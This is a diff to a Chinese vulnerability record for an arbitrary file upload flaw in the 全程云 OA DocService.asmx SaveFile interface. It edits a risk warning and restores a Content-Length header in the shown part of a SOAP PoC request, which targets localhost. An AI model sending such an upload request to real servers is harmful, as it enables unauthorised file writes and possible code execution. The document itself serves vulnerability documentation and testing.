@@ -43,7 +43,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -80,6 +80,7 @@ POC/EXP：
 POST /OA/Document/DocService.asmx HTTP/1.1
 Host: 127.0.0.1
 Content-Type: text/xml; charset=utf-8
+Content-Length: 395
 SOAPAction: "http://tempuri.org/SaveFile"
 
 <?xml version="1.0" encoding="utf-8"?>
@@ -93,7 +94,7 @@ SOAPAction: "http://tempuri.org/SaveFile"
 </soap:Envelope>
 ```
 
-> 请求长度说明：原资料 Content-Length 为 395；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 395；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ![image-20241028200856632](./.resource/全程云DocumentDocService.asmx接口存在任意文件上传漏洞/media/image-20241028200856632.png)
